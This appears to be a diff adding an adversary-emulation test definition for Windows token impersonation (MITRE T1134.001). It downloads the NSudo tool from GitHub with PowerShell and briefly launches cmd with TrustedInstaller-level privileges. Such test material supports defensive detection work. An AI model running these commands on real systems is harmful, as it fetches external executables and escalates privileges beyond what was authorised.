@@ -1,0 +1,42 @@
+api_version: "2.0"
+name: Launch NSudo Executable
+description: |-
+    Launches the NSudo executable for a short period of time and then exits.
+    NSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.
+args:
+    - name: nsudo_path
+      type: path
+      default: PathToAtomicsFolder\T1134.001\bin\NSudoLG.exe
+uuid: 7be1bc0f-d8e5-4345-9333-f5f67d742cb9
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1134: Access Token Manipulation'
+    subtechniques:
+        - 'T1134.001: Token Impersonation/Theft'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        NSudoLG.exe must exist in the specified path #{nsudo_path}
+      inline: |
+        if (Test-Path "#{nsudo_path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip" "https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip"
+        Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components" -Force
+        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLG.exe" "#{nsudo_path}"
+        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip" -Recurse -ErrorAction Ignore
+        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components" -Recurse -ErrorAction Ignore
+        }}
+      executor: powershell
+    - name: launch-nsudo-executable
+      inline: |
+        Start-Process "{{.Args.nsudo_path}}" -Argument "-U:T -P:E cmd"
+        Start-Sleep -Second 5
+        Stop-Process -Name "cmd" -force -erroraction silentlycontinue
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
